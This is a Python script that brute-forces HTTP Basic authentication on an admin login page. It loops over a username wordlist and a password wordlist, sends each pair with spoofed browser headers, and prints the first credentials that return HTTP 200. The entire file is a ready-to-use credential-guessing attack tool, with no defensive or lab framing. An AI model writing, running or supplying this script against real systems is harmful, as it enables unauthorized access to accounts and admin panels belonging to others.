import base64
import requests

url = "https://urSiteLoginAuthBasic/admin"

username_list = "/list/username/location"
password_list = "/list/password/location"

#you can add category ur http request headers here
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
}

def try_login(username, password):
    auth_string = f"{username}:{password}"
    auth_encoded = base64.b64encode(auth_string.encode()).decode()
    headers["Authorization"] = f"Basic {auth_encoded}"
    response = requests.get(url, headers=headers)
    return response

with open(username_list, "r") as u_file:
    usernames = u_file.readlines()

with open(password_list, "r") as p_file:
    passwords = p_file.readlines()

for username in usernames:
    username = username.strip()
    for password in passwords:
        password = password.strip()
        print(f"Trying username: {username}, password: {password}")
        response = try_login(username, password)

        if response.status_code == 200:
            print(f"[+] Login Success Using Username: {username} and Password: {password}")
            exit(0)
        elif response.status_code == 401:
            print("[-] Failed Login")
        else:
            print(f"[!] Unexpected Response: {response.status_code}")
